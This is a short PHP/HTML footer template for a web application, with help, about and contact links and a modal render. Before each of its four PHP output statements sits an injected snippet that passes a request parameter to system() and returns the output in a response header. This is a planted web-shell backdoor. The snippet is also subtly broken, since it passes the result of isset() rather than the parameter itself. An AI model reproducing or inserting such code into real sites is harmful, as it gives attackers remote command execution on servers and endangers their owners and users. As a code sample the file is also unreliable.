	</div>
<div class="footer">
	<div class="container">
		<ul class="footer-links">
			<li><a href="#"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.help'); ?></a></li>
			<li><a href="#"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.about'); ?></a></li>
			<li><a href="contact.php"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.contact'); ?></a></li>
		</ul>	
	</div>
</div>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo View::make('modals.load')->render() ?>

</body>
</html>